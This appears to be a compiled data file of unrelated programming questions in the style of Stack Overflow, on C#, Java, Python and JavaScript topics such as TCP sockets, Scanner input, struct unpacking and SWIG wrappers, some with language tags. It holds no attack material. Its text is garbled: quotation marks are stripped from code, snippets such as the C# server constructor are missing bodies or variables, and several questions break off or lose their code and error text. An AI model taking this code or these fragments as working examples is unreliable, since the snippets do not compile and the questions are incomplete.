"Hi im trying to make a client and server which can read and write info back and forth between each other. i can write from the client and server reads it but not vise versa and i have no idea why. nobody on here seems to know when i asked before and i cant find anything online that works. if you know please tell me and not tell me to go read an article about tcp because it doesnt help at all.

Client:

    namespace ExampleClient
    {
    public partial class Form1 : Form
    {
    public static bool IsConnected;
    public static NetworkStream Writer;
    public static NetworkStream Receiver;

    public Form1()
    {
        InitializeComponent();
    }

    private void BtnConnect_Click(object sender, EventArgs e)
    {
        TcpClient Connector = new TcpClient();
        Connector.Connect(TxtIP.Text, Convert.ToInt32(TxtPort.Text));
        IsConnected = true;
        Writer = Connector.GetStream();
        Console.WriteLine(Connected);

        System.Threading.Thread Rec = new System.Threading.Thread(new System.Threading.ThreadStart(Receive));
        Rec.Start();
    }

    private void BtnWrite_Click(object sender, EventArgs e)
    {
        try{
            byte[] Packet = Encoding.ASCII.GetBytes(Client Write Test);
            Writer.Write(Packet, 0, Packet.Length);
            Writer.Flush();}
        catch{
            try { Writer.Close();} catch { }}
    }

    public static void Receive()
    {
        while (true){
            try{
                byte[] RecPacket = new byte[1000];
                Receiver.Read(RecPacket, 0, RecPacket.Length);
                Receiver.Flush();
                string Message = Encoding.ASCII.GetString(RecPacket);
                MessageBox.Show(Message);
            }
            catch { break;}
        }
    }
    }
    }

Receiver/ Server:

    namespace ExampleServer
    {
    public partial class Form1 : Form
    {
    public static NetworkStream Writer;
    public static NetworkStream Receiver;

    public Form1()

        Server.Start();
        TcpClient Connection = Server.AcceptTcpClient();
        Receiver = Connection.GetStream();
        System.Threading.Thread Rec = new System.Threading.Thread(new System.Threading.ThreadStart(Receive));
        Rec.Start();
    }

    public static void Receive()
    {
        while (true)
        {
            try
            {
                byte[] RecPacket = new byte[1000];
                Receiver.Read(RecPacket, 0, RecPacket.Length);

                string Message = Encoding.ASCII.GetString(RecPacket);
                MessageBox.Show(Message);

                    Writer.Write(Packet, 0, Packet.Length);
                    Writer.Flush();}

            }
            catch { break; }
        }
    }
    }
    }

So when the server reads the message from the client, it displays it which works fine but when it goes to write a message back to the client, it crashes with the error system.nullreferenceeexception: object reference not set to an instance of an object. at exampleserver.form1.receive().

"Probably a basic question; sorry and thank you for your help:
I have an object with one of its properties being an array of bytes. I assign that property to object called obj1. Basically, when I assign that property to a variable, it acquires the {System.Byte[]} type which is an object, not an array. As a result, I cannot access it. Problem is, whoever wrote the class did not define any .GetValue() method, so, I cannot really access the elements, but the debugger watch shows the values! The only methods defined for that object are Equals GetType and ToString (which returns System.Byte and not the values). I have tried the following without any luck:

var vals = (System.Byte[])obj1    //Returns a {System.Byte[]} object

var vals = (obj1 as System.Byte[])   //Returns a {System.Byte[]} object

var vals = obj1.GetValue           //Complains that GetValue is not defined

It is driving me crazy that I can see the array values using the watch window, but, am having trouble accessing the elements.

I have an application that can be started in this way:

If there is not an instance of the application with the same GUID, a new instance should be started with ID={GUID} and the specified file should be loaded in it.

If there is an instance of the application with the same GUID, the user should be asked if he wants to close the file he is working on and if he confirms it - then the new file specified should be opened in the running instance.

scanner java: - how to  read  what type of data user entered   i am very new to programming and what i started doing is writing a code that converts different units in metric system. for example  the program asks the user to enter x-amount of kilometer and then it converts that value to miles etc. of course km &amp; miles can only be positive values. however  i don t seem to get around of telling the program:  if entered value is an alphabetic value  then ask user to reenter the value.  i seem to get it working for negative values  but not for alphabetic characters  please help.     <strong>here is my code:</strong>   <pre><code>    //method for converting kilometer to mile. will be invoked in main method     public static void kmtomiles(double k  double mi) {     scanner scan = new scanner(system.in);     system.out.println( convert kilometer to mile: );     k = scan.nextdouble();     mi = k / 1.609344;     if(mi &lt; 0) {         do {             system.out.println( entered value can not be negative. enter a positive value: );             k = scan.nextdouble();             mi = k / 1.609344;         } while (mi &lt; 0);     }         bigdecimal bd = new bigdecimal(mi);         bd = bd.setscale(1  roundingmode.ceiling);         system.out.println((int) k +   kilometer(s) =:   + bd +   miles );         system.out.println( *****************************************\n );         scan.close(); } </code></pre>,java
simple coding problems  in the country of rahmania  the cost of mailing a letter is 40 sinas for letters up to 30 grams. between 30 g and 50 g  it is 55 sinas. between 50 g and 100 g  it is 70 sinas. over 100 g  it costs 70 sinas plus an additional 25 sinas for each additional 50 g (or part thereof). for example  101 grams would cost 70 + 25 = 95 sinas. 149 g would also cost 95 sinas  because both of these packages only use the first 50 g over 100 g. write a program that prompts the user for a mass and then gives the cost of mailing a letter having that mass.    this is the question and the only part i don t know how to do is the last part with the additional 25 sinas for each additional 50g.    can someone show me how to write this part of the code     i use netbeans btw.   <pre><code>scanner input = new scanner(system.in); double l; l = input.nextint(); x = l &gt;= 100 / 50 * 25 + 70; if (l &lt;= 30) {     system.out.println( 40 sinas ); } if (l &gt; 30 &amp;&amp; l &lt; 50) {     system.out.println( 55 sinas ); } if (l &gt; 50 &amp;&amp; l &lt; 100) {     system.out.println( 70 sinas ); } if (l &gt;= 100) {     system.out.println(  ); } </code></pre>   here s the important part of the code. as you can see i need help on the last part.,java

character validation for each newline  i m trying to find a way to validate if each line being read from  srcfile  starts with an alpha character. i tried using the character.isletter() method but it complains about line being declared as a string and not a char array...from what i thought  a string is an array of characters  but appearently isletter() does not work in that way. i m wondering what method i could use. i want to filter the data from srcfile and place it a hashmap and vector but i first need to find an effective and clean way to figure out if the line starts with alpha characters. i also thought about using string.contains() because i know what specfic char sequence i m looking for but it would proce to be more verbose and possibly uneccesary way of coding and it also makes my program less generic  which i want to a certain extent.   <pre><code>    try {         scanner myscanner = new scanner(srcfile);         // why not declare line outside while loop          // and write cond. as (line = myscan... != null)           while (myscanner.hasnextline()) {             string line = myscanner.nextline();             //system.out.println(line);              if (character.isletter(line[0])) {              }         }         myscanner.close();     } catch (filenotfoundexception e) {         e.printstacktrace();     } </code></pre>   the rest of the condition would like this:   <pre><code>                //if first char start with a aplha char  move to the ticket list                 if (char.isletter(line[0]))                 {                     ticket t = new ticket();                     t.parseline(line);                     //logger.debug(line);                      tickets.add(t);                 }                 else                 {                     sbpeople sbupeople = new sbpeople();                     sbupeople.parseline(line); </code></pre>,java

"I'm having a bit of trouble trying to write a single  to a file in C# as I can't seem to get the escape sequence to work. The idea being I want to write the line survey id=6737AF7F-F422-4995-B781-B3DE315DFE6D to a file where the GUID itself is user input. 

my current code for this is 

<pre><code>XML.Add(&lt;survey id= + \\ + surveyGUID.Text + \\ + &gt;);

which writes survey id=6737AF7F-F422-4995-B781-B3DE315DFE6D.

Every variation I've tried either won't build, comes out the same way or writes survey id=\6737AF7F-F422-4995-B781-B3DE315DFE6D\. Can this be done? Is there another escape sequence I don't know about?

creating a coin flip class  i have recently begun programming at university and i am a little stumped with one of my tutorial problems.    i basically need to create a method within a class which uses the random.nextint() method to flip a coin  assigning and saving the value once the process has been run.    my current attempts include this:   <pre><code>public void flip() {  int flipresult;  flipresult = mrandnumgen.nextint(1);  if(flipresult == 0) { mface =  h ; } else { mface =  t  }  } </code></pre>   mface and mrandnumgen are variables which have been declared already outside the specific method. what exactly is going wrong here  i can t for the life of me get this to work :/,java

from classic multithreaded to java.nio asynchronous/non-blocking server  i m the main developer of an online game.  players use a specific client software that connects to the game server with tcp/ip (tcp  not udp)    at the moment  the architecture of the server is a classic multithreaded server with one thread per connection. but in peak hours  when there are often 300 or 400 connected people  the server is getting more and more laggy.    i was wondering  if by switching to a java.nio.* asynchronous i/o model with few threads managing many connections  if the performances would be better. finding example codes on the web that cover the basics of such a server architecture is very easy. however  after hours of googling  i didn t find the answers to some more advanced questions:    1 - the protocol is text-based  not binary-based. the clients and the server exchanges lines of text encoded in utf-8. a single line of text represents a single command  each lines are properly terminated by \n or \r\n. for the classic multithreaded server  i have that kind of code :   <pre><code>public connection (socket sock) { this.in = new bufferedreader( new inputstreamreader( sock.getinputstream()   utf-8  )); this.out = new bufferedwriter( new outputstreamwriter(sock.getoutputstream()   utf-8 )); new thread(this) .start(); } </code></pre>   and then in run  data are read line by line with readline.    in the doc  i found an utilitiy class channels that can create a reader out of a socketchannel. but it is said that the produced reader wont work if the channel is in non-blocking mode  what contradicts the fact that non-blocking mode is mandatory to use the highly performant channel selection api i m willing to use. so  i suspect that it isn t the right solution for what i would like to do. the first question is therefore the following: if i can t use that  how to efficiently and properly take care of breaking lines and converting native java strings from/to utf-8 encoded data in the nio api  with buffers and channels  do i have to play with get/put or inside the wrapped byte array by hand  how to go from bytebuffer to strings encoded in utf-8   i admit to don t understand very well how to use classes in the charset package and how it works to do that.    2 - in the asynchronous/non-blocking i/o world  what about the handling of consecutive read/write that have by nature to be executed sequencially one after the other  for example  the login procedure  which is typicly challenge-response-based: the server sends a question (a particular computation)  the client sends the response  and then the server checks the response given by the client. the answer is  i think  certainly not to make a single task to send to worker threads for the whole login process  as it is quite long  with the risk to freeze worker threads for too much time (imagine that scenario: 10 pool threads  10 players try to connect at the same time; tasks related to players already online are delayed until one thread is again ready).    3 - what happens if two different threads simultaneously call channel.write(bytebuffer) on the same channel  do the client might receive mixed up lines   for example if a thread sends  aaaaa  and another sends  bbbbb   could the client receive  aaabbbbbaa   or am i ensured that everyting is sent in a consist order  am i allowed to modify the buffer used right after the call returned  or asked differently  do i need additional synchronization to avoid this sort of situation  if i need additionnal synchronization  how to know when release locks and so on  upon write finishes  i m afraid that the answer isn t as simple as registering for op_write in the selector. by trying that  i noticed that i get the write-ready event all the time and always for all clients  exiting selector.select early mostly for nothing  since there are only 3 or 4 messages to send pers second per client  while the selection loop is performed hundreds of times per second. so  potentially  active wait in perspective  what is very bad.    4 - can multiple threads call selector.select on the same selector simultaneously without any concurrency problems such as missing an event  scheduling it twice  etc     5 - in fact  is nio as good as it is said to be   would it be interesting to stay to classic multithreaded model  but unstead of creating a thread per connection  use fewer threads and loop over the connections to look for data availability using inputstream.isavailable   is that idea stupid and/or inefficient,java
running a simple script from desktop  so i m an extreme beginner to programming  just starting the python class on coursera. using python 2.7.10    anyway  i made a simple print statement script in notepad++    <pre><code>print  hello world  </code></pre>   and saved as a python file on my desktop    <pre><code>newprog.py </code></pre>   however when i try to run it a cmd window appears and disappears and i m not quite sure whats wrong.    the other question that this was linked as a duplicate to is about accessing python through the command prompt  which i don t have a problem with. from answers given it is now apparent to me that my dilemma was due to an erroneous belief that the interpreter would remain open after running whatever script i wrote.,python

conventions of importing python main programs  often i write command line utilities that are only meant to be run as main. for example  i might have a file that looks like this:   <pre><code>#!/usr/bin/env python  if __name__ ==  __main__ :     import sys     # do stuff </code></pre>   in other words  there is nothing going on that isn t under the if statement checking that this file is being run as main. i tried importing a file like this to see what would happen  and the import was successful.    so as i expected  one is allowed to import files like this  but what is the convention surrounding this practice  is one supposed to throw an error telling the user that there is nothing to be imported  or if all the contents of the file are supposed to be run as main  does one need to check if the program is being run as main  or is the conditional not necessary      also  if i have import statements  should they be at the top of the file  or under the conditional  if the modules are only being used under the conditional  it would seem to me that they should be imported under the conditional and not at the top of the file.,python

javascript object referencing  so  i m pretty new to javascript  and while i know the little tricks to do things like this in java the same tricks don t really apply here  or at least i can t really figure out how to use them  so i m currently using two objects in the form of collections:   <pre><code>var connectedclients_socket = {}; var connectedclients_networkid = {}; </code></pre>   the hold a key/value pair to link a <code>networkid</code> to a client and then a duplicated object that uses the socket as a key. any optimizations would be great  i ll be grabbing the client by the socket and id a lot throughout the application.    <strong>on to the problem:</strong>    upon disconnection i need to remove the client instance from the <code>connectedclients_networkid</code> object. from my understanding this is done using the <code>delete</code> keyword.    here s the code i m currently trying to use for this:   <pre><code>console.log( socket disconnected ); delete client.connectedclients_networkid[client.connectedclients_socket[socket].getnetworkid()]; delete client.connectedclients_socket.socket; </code></pre>   however this is giving me the following error:    <pre><code>typeerror: cannot call method  getnetworkid  of undefined </code></pre>   which shows that   <pre><code>client.connectedclients_socket[socket] </code></pre>   is returning undefined  while <code>client.connectedclients_socket.socket</code> is being removed successfully a line later. i ve looked up a few different pages on getting a value from a key in javascript  and i don t see what i m doing wrong.    here s the constructor for a client:   <pre><code>var client = function(networkid  socket  ...) {     this.networkid = networkid;     this.socket = socket;     ...     connectedclients_socket.socket = this;     connectedclients_networkid.networkid = this; } </code></pre>,javascript
sending function pointer with arguments with it and then add additional arguments while invoking  i have a map which says maps a string to a function like :   <pre><code>validator = { first_name  : validate_str                last_name  : validate_str                phone  : validate_phone } </code></pre>   i need to call the corresponding validate function based on the type of value i have in the map that will be fed to me as input for e.g.   <pre><code>for name in elements:     # validate the value of this name in the input map using the function     # input is the map that has the value for each of these fields     # elements is a list of all fields used to loop through one input at a time     if validator[name]( input[name] ) is false:         # throw validation error     else:         # do something else </code></pre>   this works fine unless for this scenario i am not sure if it can be done:    the validate_str also checks if a given string is of desired max length.   <pre><code>def validate_str(str  max-len):     # throw error if len(str) &gt; max-len </code></pre>   the max-len can differ based on the string  so i need to call validate_str for first_name with say 64 characters and last name with 256 characters.     i can use a different map to say that this field has this max_len  but is it possible for the validator map to have pointer to the validate_str function with the max-len argument preset based on the field     something like:   <pre><code>validator = { first_name  : validate_str(max-len=64)                last_name  : validate_str(max-len=256)                phone  : validate_phone } </code></pre>   then call it for validation like:   <pre><code>if validator[name]( str=input[name] ) is false:     # the appropriate value for max-len goes with the function call and just the     # str is appended to the argument list while invoking.  </code></pre>   this makes life easier so that we need not then remember again what fields will have the max-len sent along with it.,python

<ol>
<li>The app does <strong>not</strong> have consistent access to the internet</li>
<li>There are multiple instances of the application running</li>

My thought was to get a local copy of the database, log all the interactions with the local database (or someway to queue the interactions for later use), then have the option to sync the remote and local database (send the local commands to the remote database, drop the local database, get the remote database).

<a href=https://msdn.microsoft.com/en-us/library/dn469464(v=vs.113).aspx rel=nofollow noreferrer>This article on MSDN</a> was pretty helpful, but I have some concerns. The main purpose of the queue is to store updates and inserts to the local table, but this route does not look like it stores the parameters for use (has them commented).

Any suggestions or thoughts on the best way to handle this?

unpacking  0xff  vs.  \xff   i m trying to read the binary data from a wavefile using the wave library.  the data is read and reported as string literals of the form  \x0f\x06\x0a...  and i would like to convert hexadecimal numbers to integers (you know  in base ten).  the problem i m having is that these strings aren t really being treating as hex numbers  but sort of like unicode characters.   <pre><code>import wave import struct  path= c:\\directory\\file.wav   file=wave.open(path  r ) data=file.readframes(10)  print repr(data) </code></pre>    \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00    <pre><code>int_dat=struct.unpack( 10i  data) </code></pre>   the error that comes up when i try something like   <pre><code>struct.unpack( i   \xff ) </code></pre>   is that struct.unpack is expecting a string of length 4  and is only receiving a string of length 1.  it s clear to me why that s happening  but is there a format option for unpack that will allow me to unpack  \xff     <pre><code>struct.unpack( i   0xff ) </code></pre>   obviously works fine.  similarly   <pre><code>struct.unpack( i  r \xff ) </code></pre>   works.    alternatively  is there a convenient to convert a string that looks like  \xff\x01\x63...  to either a raw string (though i m not sure that makes sense since the  \x  is being treated as an escape character (is that the right term ) and not a character)  or to the form  0xff0x010x63 .,python

standard default first argument to pass to fn.apply  i have recently learned about the magic of <code>fn.apply()</code> in javascript  and i am using it to save function calls with all their arguments intact and call them at a later date.    however  in my use case  i do not need the first argument  the context (<code>this</code>)  and i d like to avoid passing the <code>this</code> object into it somehow in order to make it clear in my code that i m not using <code>.apply()</code> for that.    my first thought was passing in <code>null</code>  but i read the following on <a href= https://developer.mozilla.org/en-us/docs/web/javascript/reference/global_objects/function/apply  rel= nofollow >mdn</a>:   <blockquote>    if the method is a function in non-strict mode code  <code>null</code> and <code>undefined</code> will be replaced with the global object  and primitive values will be boxed.  </blockquote>   this seems to imply that passing <code>null</code> or even <code>false</code> is bad practice. what would be an appropriately falsy  empty  or otherwise obviously placeholder value to put into <code>fn.apply()</code> s first argument,javascript

"I'm maintaining one program written in C# 2.0 (VS2005). It has pretty large codebase, lot of authors, it is almost internal app, but currently it is also one of our customers using it. 

App is multilingual and translation of own forms and components works OK. But, there is one component - DockPanel Suite by WeifenLuo and I need to translate it to another language (zh-CN) - one of the chinese guys translated resource file to his language and now I'm trying to include and use in application, but I'm failing in it - although whole app is in chinese, this component remains in english. The untranslated resource file can be found on github: <a href=https://github.com/dockpanelsuite/dockpanelsuite/blob/master/WinFormsUI/Docking/Strings.resx rel=noreferrer>https://github.com/dockpanelsuite/dockpanelsuite/blob/master/WinFormsUI/Docking/Strings.resx</a>

How to do that? I tried almost everything, naive approach (just <code>resgen</code> and compile by <code>al</code>, and trying to use it as satellite assembly - also tried <code>ilmerge</code>), then opening DockPanelSuite in VS2013 Express, adding resx as Strings.zh-CN.resx, but nothing works and tooltips and others are still in english.

Tried also stepping-in with debugger, but debugger broke at <code>tooltip = Strings.DockPaneCaption_ToolTipAutoHide</code> but it didn't step into getter defined in Strings.Designer.cs 

I'm stuck and I don't know, how to do that. Any idea? Thanks very much!

java: creating objects with variable type and calling methods on an object with variable name  i have a hashmap with keys of type string and values of type arraylist.    it looks something like this:   <pre><code>key:  .avi   value: {new videoresource(var)   videoresources } </code></pre>   i want to do the following things:    1. create a new variable with the same type as that of the one found in the hashmap. this time i would want to create a new videoresource  but it could be anything (audioresource  imageresource...) depending on what s inside the hashmap. the types always take the same parameter  var   however.    so  i want to do:   <pre><code>someresource resource = new someresource(var); </code></pre>   where someresource is decided by the type of some object.    2. call a method on an object  that is previously instantiated  with the name given by   <pre><code>string objectname = hashmap.get(key).get(1); </code></pre>   the object will always have the method and the method being called will always have the same name.    so  i want to do:   <pre><code>objectname.methodname(); </code></pre>   where objectname is decided by some string.    how can i achieve this     edit    the context is this:    for an assignment i ve been tasked to refactor a bit of code in the open-source project freecol. the method i am refactoring is createresource shown below. the problem with it is  that in addition to the very repetitive if-statements  it violates the open/closed principle. we want it to be open for extension  i.e. adding a new extension type (.avi etc.)  but closed for modification  i.e. you shouldn t have to modify a whole bunch of code to do so.    the method looks like this:   <pre><code>public static void createresource(uri uri  resourcesink output) { if(findresource(uri  output))     return;  try {     if ( urn .equals(uri.getscheme())) {         if (uri.getschemespecificpart().startswith(colorresource.scheme)) {             colorresource cr = new colorresource(uri);             output.add(cr);             colorresources.put(uri  new weakreference&lt;&gt;(cr));         } else if (uri.getschemespecificpart().startswith(fontresource.scheme)) {             fontresource fr = new fontresource(uri);             output.add(fr);             fontresources.put(uri  new weakreference&lt;&gt;(fr));         }     } else if (uri.getpath().endswith( \  )             &amp;&amp; uri.getpath().lastindexof(                         uri.getpath().length()-1) &gt;= 0) {         stringresource sr = new stringresource(uri);         output.add(sr);         stringresources.put(uri  new weakreference&lt;&gt;(sr));     } else if (uri.getpath().endswith( .faf )) {         fafileresource far = new fafileresource(uri);         output.add(far);         fafresources.put(uri  new weakreference&lt;&gt;(far));     } else if (uri.getpath().endswith( .sza )) {         szaresource szr = new szaresource(uri);         output.add(szr);         szaresources.put(uri  new weakreference&lt;&gt;(szr));     } else if (uri.getpath().endswith( .ttf )) {         fontresource fr = new fontresource(uri);         output.add(fr);         fontresources.put(uri  new weakreference&lt;&gt;(fr));     } else if (uri.getpath().endswith( .wav )) {         audioresource ar = new audioresource(uri);         output.add(ar);         audioresources.put(uri  new weakreference&lt;&gt;(ar));     } else if (uri.getpath().endswith( .ogg )) {         if (uri.getpath().endswith( .video.ogg )) {             videoresource vr = new videoresource(uri);             output.add(vr);             videoresources.put(uri  new weakreference&lt;&gt;(vr));         } else {             audioresource ar = new audioresource(uri);             output.add(ar);             audioresources.put(uri  new weakreference&lt;&gt;(ar));         }     } else {         imageresource ir = new imageresource(uri);         output.add(ir);         imageresources.put(uri  new weakreference&lt;&gt;(ir));     }     catch (exception e) {         logger.log(level.warning   failed to create resource with uri:   + uri  e);     } } </code></pre>   so what i want to do  is to get rid of all the else ifs that handle the file extensions  and replace them with a single call to a method assignresource that creates the right resource   <pre><code>someresource resource = new someresource(uri); </code></pre>   adds it to the output   <pre><code>output.add(resource); </code></pre>   and puts it in the right weakhashmap   <pre><code>someresource.put(uri  new weakreference&lt;&gt;(resource)); </code></pre>   these hashmaps are declared as following:   <pre><code>private static final map&lt;uri  weakreference&lt;colorresource&gt;&gt; colorresources = new weakhashmap&lt;&gt;(); private static final map&lt;uri  weakreference&lt;fontresource&gt;&gt; fontresources = new weakhashmap&lt;&gt;(); private static final map&lt;uri  weakreference&lt;stringresource&gt;&gt; stringresources = new weakhashmap&lt;&gt;(); private static final map&lt;uri  weakreference&lt;fafileresource&gt;&gt; fafresources = new weakhashmap&lt;&gt;(); private static final map&lt;uri  weakreference&lt;szaresource&gt;&gt; szaresources = new weakhashmap&lt;&gt;(); private static final map&lt;uri  weakreference&lt;videoresource&gt;&gt; videoresources = new weakhashmap&lt;&gt;(); private static final map&lt;uri  weakreference&lt;imageresource&gt;&gt; imageresources = new weakhashmap&lt;&gt;(); </code></pre>   i have code that extracts the file extension from the uri  and puts it as a key  along with the associated object (i.e. videoresource()) and the name of the object upon with we want to invoke the put() method (i.e.  videoresources )  as values.    the idea is that if you would add a new extension type  you just have to do one function call to my method addresource:   <pre><code>addresource(resourcemap   .ogg   new videoresource(uri)   videoresources ); </code></pre>   that adds these parameters to the map of file extensions it can handle.    instead of all the else if statements  a single call to a method assignresource   <pre><code>assignresource(uri  resourcemap); </code></pre>   would be made.    so the problem i faced was how to create a new object of a type that matches that of the one found in my hashmap  and then invoking method put() on the right weakhashmap (videoresources etc.).    edit    more questions.    the line <code>output.add(resource);</code> gives an error because resource is a resource and not one of the subtypes. the next line  <code>resources.add(uri  resource);</code> complains about type safety  that references should be parameterized. i changed the interface to your second suggested generic one. an example of what a resources implementation now looks like is this:   <pre><code>class stringresources implements resources&lt;stringresource&gt; {      private final map&lt;uri  weakreference&lt;resource&gt;&gt; resources = new weakhashmap&lt;&gt;();     @override     public boolean matches(uri uri) {         return uri.getpath().endswith( \  )             &amp;&amp; uri.getpath().lastindexof(     uri.getpath().length() - 1) &gt;= 0;     }      @override     public stringresource from(uri uri) {         return new stringresource(uri);     }      @override     public void add(uri uri  stringresource resource) {         resources.put(uri  new weakreference&lt;&gt;(resource));     }   } </code></pre>   is this how you meant they should look  in that case  how should we change the lines   <pre><code>resource resource = resources.from(uri); output.add(resource); resources.add(uri  resource); </code></pre>   so that the resource is of the right subtype when we call output.add,java

return values in javascript functions  i was reviewing variable accessibility in functions vs. the global scope and came across something new and wondered if the following is correct:   <pre><code>function foo (){     message= hi  } alert(message); //referenceerror: message is not defined </code></pre>   this returns an error because <code>foo</code> hasn t been called anywhere yet  but once you do  it s available in the global space. got it.    however i read somewhere besides explicitly making functions return a value (i.e. using the return keyword) we use them for their side-effects (e.g. imagine i put that alert function inside foo i just referenced).    so is the above somehow returning the value the same way it would when using the <code>return</code> keyword     <strong>update</strong> i am getting a lot of feedback but perhaps i should restate the question. is the mere fact of calling the function putting it in the global scope. like what is happening behind the scenes...  i think some people may think (as i did) by simply omitting the var  it s in the global scope. actually  for those who don t know  you have to call the function first. thanks!,javascript
which is the fastest structure for processing integers(add read from thousands of nodes)  i am trying to find out which structure would be the fastest  because i have a problem with my code. i have a large amount of data to store. maybe thousands of nodes are needed. my first thought was to create an arraylist and then i started adding integers to use them  later. this arraylist will be useful for fast accessing bytes in random access files. so  i put the first node  which represents a pointer to the first entry in a random access file. then  i put the second  at the same way  and so on..    my program takes too long when putting the integers in the arraylist.  could i fix my code using a faster structure,java

change java object type   during the runtime of my programme  i would like to identify the type of an object i would need to instantiate.    as an example: if a user is travelling from a to b  he can choose a transport method: car or push bike  both will enable the user to travel  but the actual work processes are different. in a car you need to shift gears to move  on a bike you need to paddle. they would have a common set of methods  ie:  move   but their implementation would be different.    the rest of the programme doesn t need to know how  move  is implemented...    imagine:   <pre><code>public class transport {    public object transportmethod;     public transport(tmet) {       if (tmet.equals( car )) {          transportmethod = new car();       }       else if (tmet.equals( bike )) {          transportmethod = new bike();       }    }     public object returntransportmethod() {       return transportmethod();    } } </code></pre>   how can i now use the bike or car methods when i pass transportmethod back to another class     thanks!    chris,java
how can i turn this  while  loop into a  for  loop   i m working through lpthw  on exercise 33  and on the very last study drill  they ask to change the code i have to a  for  loops  rather than the  while  loop i ve written. here s the code i ve come up with:   <pre><code>numbers = []  def loop(i  x  new_num):     while i &lt; x:         print  at the top i is %d  % i         numbers.append(i)          i = i + new_num         print  numbers now:    numbers         print  at the bottom i is %d  % i       print  the numbers:        for num in numbers:         print num  loop(0  10  6) </code></pre>   now the study drill instructs me to   now  write it to use for- loops and range instead. do you need the incrementor in the middle anymore  what happens if you do not get rid of it      this is how far i ve managed to get  but i ve got no idea if i m going in the right direction. basically just shooting in the dark:   <pre><code>numbers = [] new_numbers = [0] def loop2():     for i in new_numbers:          print  at the top i is %d  % i         numbers.append(i) </code></pre>   i don t know where to insert a  range  function either. if i managed to turn this into a  for  loop that did exactly what this  while  loop code does  what would it look like,python
read digits (instead of int) from a txt file in java  i have a file like this     test.txt:    122352352246    12413514316134    now i want to read each digit a time  and store it as one element in  say  a list. i tried using scanner. but it will read a line each time  and outputs a long integer. that means if i want to get the digits  i need to further separate the digits in that integer. i guess there must be an elegant way to directly read one digit each time. below is my code   <pre><code>public class readdigits {  public static void main(string[] args) throws ioexception{     list&lt;integer&gt; list = new arraylist&lt;integer&gt;();     file file = new file( test.txt );     scanner in = new scanner(file);     int c;     try {          while (in.hasnext()){              c = in.nextint();              list.add(c);          }      }     finally {         system.out.println(list);         in.close();     }  }   } </code></pre>,java

is it possible to return a value from settimeout without a callback function   long story short  is it possible to do something like this without a callback function    <pre><code>function foo(){   return  foo ; } function bar(){   x = settimeout(foo  2000);   alert(x); } </code></pre>   without modifying the foo() function. adding an intermediary function would be fine  but i don t think that ll accomplish anything.    long story: i m looking to simulate window.showmodaldialog via window.open without having to do significant code rewrites everywhere the dang thing was used. the only suggestions i have found are to use a while loop or ping the server to simulate sleep(). neither solution strikes me as ideal  and i am wondering if there is any other way to do something like this minus the callback function method,javascript

how to simultaneously process 2 fasta generators  this seems so trivial  yet its giving me a hard time. i would simply like to process two fasta generators at the same time so as to compare the first header and sequence of one file with the first header and sequence of another file  the second to the second  and so on until both files are complete.     both fasta files have the same number of sequences  and they are ordered as 2 reads of a pair e.g. the first sequence of fasta1 and the first sequence of fasta 2 are read pairs and so on til the end of the files.     i have a generator that gives me the header and sequence for each sequence of a fasta file   <pre><code>def fileparse (self):     # get file from __init__ and open.     # parse header and sequence     yield (header  sequence) </code></pre>   however i can t seem to figure out how to iterate over two files at the same time. i started with this:   <pre><code># x class variable sends first fasta # y class variable sends second fasta  for header  sequence in x.fileparse():     for header2  sequence2 in y.fileparse():         # compare headers and evaluate. </code></pre>   obvsiously the problem here is that i compare each header in one file to each header in another  where i only want to compare the first header to the first header  the second to the second  and so on.    i am having difficulty cause it seems as if i always need to iterate through the generator. maybe i need to adjust the genrator method itself to generate a header and sequence for two files simultaneously     thank you,python
benefits to be gained from cloning immutable objects in java  let s say we have a java object that has only primitive fields marked as final and as such is immutable.    now several threads need the information contained in this object to do their work  so one has two choices:   <ol> <li>hand the reference to a single instance to all threads.</li> <li>create a clone/copy of the object for each thread.</li> </ol>   essentially the question boils down to this: internally  does the jvm gain any benefits from copying the object  for example because reads become more efficient  or would it be a mere waste of memory because it doesn t matter,java

"I have an application using the OWIN middleware for OpenIdConnect.  The startup.cs file uses the standard implementation of app.UseOpenIdConnectAuthentication.  The cookie is set to the browser, but it errors with:

</blockquote>

I've found that when running fiddler as I do for most debug projects this behavior happens.  The error is returned, but if I go back to the site everything is working and my user is authenticated.  Has anyone seen this behavior when running fiddler?

With fiddler:

<ul>
<li>SecurityTokenValidated notification in OpenIdConnect is executed twice.</li>
<li>After the second pass through the IDX10311 error is thrown</li>
<li>Browser contains the valid cookie, going back to the page I can view the valid User.Identity data.</li>
</ul>

Running without fiddler:

<ul>
<li>SecurityTokenValidated executes once in OpenIdConnect</li>
<li>No error thrown, proceeds to load up controller action for post authentication redirect Uri</li>
<li>Cookie also valid and User.Identity data correct.</li>
</ul>

Ideas?  I can get around it without running fiddler, but when debugging it would be nice to also run fiddler to inspect traffic.

"My c# code is using a third-party library, written in C++ and using Swig to wrap it in C# (*three projects here, MyCodeCS, ThirdCpp and ThirdCs*)

So if I have class Acpp with public constructors Acpp() and Acpp(int) in cpp, I end up in the wrapped c# version with class Acs, properly defined constructors Acs() and Acs(int) (so far, so good), both of them using an internal, swig-generated, constructor: Acs(IntPtr cPtr,bool).

*(Of course both the cpp and the cs classes are named A, but for clarity I'll named them with the cpp and cs suffixes)*

Now, I am integrating a new cpp module (MyCodeCpp), which contains a class Bcpp, which inherits from Acpp. So far, so good: Bcpp inherits from Acpp, and I can call it from my c# code with no problem, using its IntPtr. 

**My issue** is that for the only purpose of having my Bcs objects recognized as being a Acs, I need to define such Bcs class. Which is a pretty dumb one since I already got the cptr:

`public class Bcs : Acs
{
public Bcs(IntPtr cptr): base(cptr,true){}
}`

The thing is... Acs(IntPtr,bool) is internal, which means that if I want to do that I need to either:

 - add Bcs into thirdCS project and rebuild thirdCS, which is what I do right now and which works fine but displeases my chief architect because now we have a class which is supposed to belong to MyCodeCS as is a wrapper to a class of MyCodeCpp, which actually belongs to thirdCs
 - **somehow modify the swig behavior so that Acs(IntPtr,bool) is protected internal instead of internal**, so it can be called by a MyCodeCS-based Bcs class

The thing is: I have no clue how to do that or even if it is possible ?

Here 
I am pass ABC as a parameter for ApplicationMode function then it returns _applicationMode as 0(default value of AppMode enum)

If I pass 123 as a parameter for ApplicationMode function. But it returns _applicationMode as a 123.

Why Enum is accepting the 123 even though AppMode Enum has only two values i.e., Local and Cloud?

TryParse should give false for 123 also but it gives true for 123.

 class Info {
 public static void Main() {

    foreach (DriveInfo drive in drives) {
        //There are more attributes you can use.

        Console.WriteLine(drive.Name);
        if (drive.IsReady) Console.WriteLine(drive.TotalSize);

